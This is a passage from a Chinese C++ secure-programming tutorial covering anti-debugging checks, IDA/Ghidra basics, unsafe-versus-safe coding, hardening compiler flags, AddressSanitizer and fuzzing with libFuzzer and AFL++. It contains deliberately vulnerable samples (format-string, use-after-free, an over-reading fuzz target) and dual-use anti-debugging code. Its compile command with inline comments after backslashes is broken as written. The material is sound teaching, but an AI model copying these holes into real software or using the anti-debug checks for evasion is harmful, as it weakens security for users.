    return elapsed > 100;  // 调试时执行更慢
}

// 方法4: 检查硬件断点
bool check_debugger_4() {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    // 检查DR0-DR3是否有硬件断点
    return ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3;
}

// Linux反调试
// 方法1: ptrace检测
// if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
//     printf("检测到调试器!\n");
//     exit(1);
// }

// 方法2: /proc/self/status
// 检查TrPPid字段是否为调试器PID

// 方法3: 读取/proc/self/wchan
// 如果被调试,显示为ptrace_stop
```

### 18.3 IDA Pro/Ghidra使用基础

```text
IDA Pro常用快捷键:
  F5    反编译为C伪代码
  Space 切换图形/文本视图
  N     重命名变量/函数
  Y     更改变量类型
  G     跳转到地址
  X     查看交叉引用
  A     转为ASCII字符串
  D     转为数据
  C     转为代码
  ;     添加注释
  Shift+F5 添加函数参数类型

Ghidra常用功能:
  - 导入二进制并自动分析
  - 使用Decompiler窗口查看C伪代码
  - 使用Function Manager查看函数列表
  - 使用Symbol Tree查看符号
  - 使用Data Type Manager管理类型
  - 使用Script Manager运行脚本

逆向分析流程:
  1. 识别主函数(main/WinMain)
  2. 分析函数调用图
  3. 识别字符串和常量
  4. 分析关键逻辑分支
  5. 重命名变量和函数
  6. 添加注释
  7. 导出分析结果
```

---

## 19. 安全编程实践

### 19.1 内存安全编码规范

```cpp
// === 不安全 vs 安全编码对比 ===

// 1. 字符串操作
// 不安全
char buf[100];
strcpy(buf, input);          // 无边界检查
strcat(buf, suffix);         // 无边界检查
sprintf(buf, "%s=%d", name, val);  // 无边界检查

// 安全
char buf[100];
strncpy(buf, input, sizeof(buf) - 1);
buf[sizeof(buf) - 1] = '\0';
strncat(buf, suffix, sizeof(buf) - strlen(buf) - 1);
snprintf(buf, sizeof(buf), "%s=%d", name, val);

// C++推荐
#include <string>
std::string str = input;  // 自动管理内存
str += suffix;

// 2. 数组访问
// 不安全
int arr[100];
for (int i = 0; i <= 100; i++) {  // off-by-one!
    arr[i] = i;
}

// 安全
int arr[100];
for (int i = 0; i < 100; i++) {  // 正确边界
    arr[i] = i;
}

// C++推荐
#include <vector>
#include <array>
std::array<int, 100> arr;
for (size_t i = 0; i < arr.size(); i++) {
    arr[i] = static_cast<int>(i);
}
// 或使用at()进行边界检查
arr.at(50) = 42;  // 越界时抛出异常

// 3. 内存分配
// 不安全
int* ptr = (int*)malloc(size * count);  // 乘法可能溢出
// ... 使用后忘记释放 ...
free(ptr);
// ... 使用已释放的ptr ...

// 安全
// C++: 使用智能指针
#include <memory>
auto ptr = std::make_unique<int[]>(count);  // 自动释放
// 或
auto buf = std::make_unique<char[]>(size);
// 不需要手动free,超出作用域自动释放

// 4. 指针使用
// 不安全
int* ptr = nullptr;
*ptr = 42;  // 空指针解引用!

// 安全
int* ptr = nullptr;
if (ptr != nullptr) {
    *ptr = 42;
}

// 5. 格式化字符串
// 不安全
printf(user_input);  // 格式化字符串漏洞!
// 安全
printf("%s", user_input);
```

### 19.2 编译安全选项

```bash
# 安全编译选项汇总

# GCC/Clang安全编译选项
g++ -o secure_app app.cpp \
    -fstack-protector-all \      # 栈保护(所有函数)
    -D_FORTIFY_SOURCE=2 \         # 缓冲区函数增强
    -fPIE -pie \                 # 位置无关可执行文件
    -Wl,-z,relro \               # RELRO(部分)
    -Wl,-z,now \                 # RELRO(完全)
    -Wl,-z,noexecstack \         # 标记栈不可执行
    -fcf-protection \            # 控制流完整性
    -fsanitize=address \         # AddressSanitizer(调试用)
    -fsanitize=undefined \       # UB检测(调试用)
    -Wall -Wextra \              # 启用更多警告
    -Werror \                    # 警告视为错误
    -O2 \                        # 优化(可移除一些漏洞)
    -std=c++17                   # 使用现代标准

# MSVC安全编译选项
cl /GS /guard:cf /guard:ehcont /DYNAMICBASE /NXCOMPAT \
   /HIGHENTROPYVA app.cpp

# 检查二进制保护
checksec --file=./secure_app
```

### 19.3 AddressSanitizer使用

```cpp
// AddressSanitizer (ASAN) - 内存错误检测工具
// 编译时添加 -fsanitize=address

// 示例: 检测缓冲区溢出
// 编译: g++ -fsanitize=address -g -O0 test.cpp -o test

#include <iostream>

void test_buffer_overflow() {
    int arr[10];
    arr[10] = 42;  // 越界写入!
    // ASAN会在运行时检测到并报告:
    // ==12345==ERROR: AddressSanitizer: stack-buffer-overflow
}

void test_use_after_free() {
    int* ptr = new int(42);
    delete ptr;
    std::cout << *ptr << std::endl;  // UAF!
    // ASAN检测到: heap-use-after-free
}

void test_double_free() {
    int* ptr = new int(42);
    delete ptr;
    delete ptr;  // 双重释放!
    // ASAN检测到: attempting double-free
}

void test_memory_leak() {
    int* ptr = new int(42);
    // 忘记delete -> 内存泄漏
    // ASAN的LeakSanitizer会检测到
}

// 运行时检测
// ASAN_OPTIONS=detect_leaks=1 ./test
// ASAN_OPTIONS=halt_on_error=0:abort_on_error=1 ./test
```

---

## 20. 模糊测试(Fuzzing)

### 20.1 模糊测试基础

```text
模糊测试类型:

1. 黑盒模糊测试
   - 生成随机/变异输入
   - 不需要源码
   - 工具: AFL, libFuzzer, Honggfuzz

2. 白盒模糊测试
   - 利用代码覆盖率引导
   - 需要源码或符号信息
   - 工具: KLEE, SAGE

3. 灰盒模糊测试
   - 基于覆盖率反馈
   - 不需要完整源码
   - 工具: AFL++, libFuzzer

模糊测试流程:
  1. 识别输入接口(文件/网络/API)
  2. 编写Harness(测试驱动)
  3. 生成初始种子语料库
  4. 运行Fuzzer监控崩溃
  5. 分析崩溃原因
  6. 修复漏洞
```

### 20.2 libFuzzer使用

```cpp
// libFuzzer示例: 模糊测试解析函数
// 编译: clang++ -fsanitize=fuzzer,address -g fuzz_target.cpp -o fuzz

#include <cstdint>
#include <cstddef>
#include <string>

// 被测函数
int parse_header(const uint8_t* data, size_t size) {
    if (size < 4) return -1;
    // 模拟解析头部
    uint32_t magic = *(uint32_t*)data;
    if (magic == 0xDEADBEEF) {
        if (size < 8) return -1;  // 边界检查
        uint32_t length = *(uint32_t*)(data + 4);
        // 漏洞: 未检查length是否超过size
        char buf[256];
        if (length > 256) return -1;  // 有检查
        memcpy(buf, data + 8, length);  // 如果length > size-8,越界读
        return 0;
    }
    return -1;
}

// Fuzzer入口点
extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
    parse_header(data, size);
    return 0;
}

// 运行:
// ./fuzz corpus/ -max_len=1024 -timeout=5
// 结果:
//   corpus/ - 种子目录
//   crash-* - 崩溃输入文件
```

### 20.3 AFL++使用

```bash
# AFL++安装
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus
make all
sudo make install

# 编译目标(插桩)
afl-clang-fast++ -o target target.cpp -fsanitize=address

# 准备种子语料库
mkdir -p corpus
echo "test input" > corpus/seed1
echo "another input" > corpus/seed2

# 运行Fuzzer
afl-fuzz -i corpus -o findings -- ./target @@

# 多核并行
afl-fuzz -i corpus -o findings -M main -- ./target @@
afl-fuzz -i corpus -o findings -S slave1 -- ./target @@
afl-fuzz -i corpus -o findings -S slave2 -- ./target @@

# 分析崩溃
afl-showmap -i findings/default/crashes/id:000001 -- ./target
# 或直接用GDB调试
gdb ./target
(gdb) run < findings/default/crashes/id:000001
```

### 20.4 模糊测试最佳实践

```text
模糊测试最佳实践:

1. 语料库建设
   - 收集真实输入样本
   - 多样化输入(不同格式/大小)
   - 最小化种子(去除冗余)

2. Harness编写
   - 覆盖所有输入接口
   - 模拟真实使用场景
   - 避免不必要的异常处理
   - 确保可复现

3. 运行策略
   - 长时间运行(数天到数周)
   - 多核并行
   - 定期更新种子
   - 监控覆盖率增长

4. 崩溃分析
   - 去重(相同漏洞)
   - 最小化崩溃输入
   - 根因分析
   - 修复并回归测试

5. CI/CD集成
   - 提交时运行短时间Fuzz
   - 定期运行长时间Fuzz
   - 自动分析崩溃
   - 自动创建Issue
```

---

## 学习资源与知识拓展

### 官方资源

- **C++ 官方文档**：各语言官网提供最权威的文档和教程
- **C++ 标准库参考**：官方标准库 API 文档

### 在线教程

- **菜鸟教程 C++**：https://www.runoob.com/ — 中文入门教程
- **W3Schools**：https://www.w3schools.com/ — 交互式学习平台
- **MDN Web Docs**：https://developer.mozilla.org/ — Web 技术文档（适用于 JS/HTML/CSS）

### 安全编程资源

- **OWASP 速查表系列**：https://cheatsheetseries.owasp.org/ — 各种安全最佳实践
- **CWE 常见弱点枚举**：https://cwe.mitre.org/ — 软件弱点分类体系
- **安全开发指南**：各语言官方安全文档与最佳实践

### 安全工具与库

- 根据语言选择相应的安全库和工具（加密库、HTTP 库、网络库等）
- 关注 GitHub 上的安全开源项目与社区

### 练习平台

- **LeetCode**：https://leetcode.cn/ — 算法练习平台
- **Codewars**：https://www.codewars.com/ — 编程挑战网站
- **Hack The Box**：https://www.hackthebox.com/ — 安全靶场
- **TryHackMe**：https://tryhackme.com/ — 安全学习房间
- **Bugku**：https://ctf.bugku.com/ — 国内 CTF 平台
- **攻防世界**：https://adworld.xctf.org.cn/ — XCTF 竞赛平台

### 推荐书籍

- 《C++程序设计》— 入门经典教材
- 《C++高级编程》— 进阶学习指南
- 各类安全相关技术书籍

### 社区与资讯

- **GitHub**：https://github.com/ — 开源项目托管平台
- **Stack Overflow**：https://stackoverflow.com/ — 编程问答社区
- **FreeBuf**：https://www.freebuf.com/ — 安全资讯媒体
- **安全客**：https://www.anquanke.com/ — 安全技术媒体
- **先知社区**：https://xz.aliyun.com/ — 阿里云安全社区

### 学习路线建议

1. **入门阶段**（1-2月）：掌握基本语法、数据类型、控制流
2. **进阶阶段**（2-3月）：函数、面向对象、异常处理、标准库
3. **实战练习**（1-2月）：通过项目巩固知识
4. **安全方向**（持续）：了解语言相关的安全漏洞和防护
5. **持续学习**：关注社区、阅读源码、参与开源
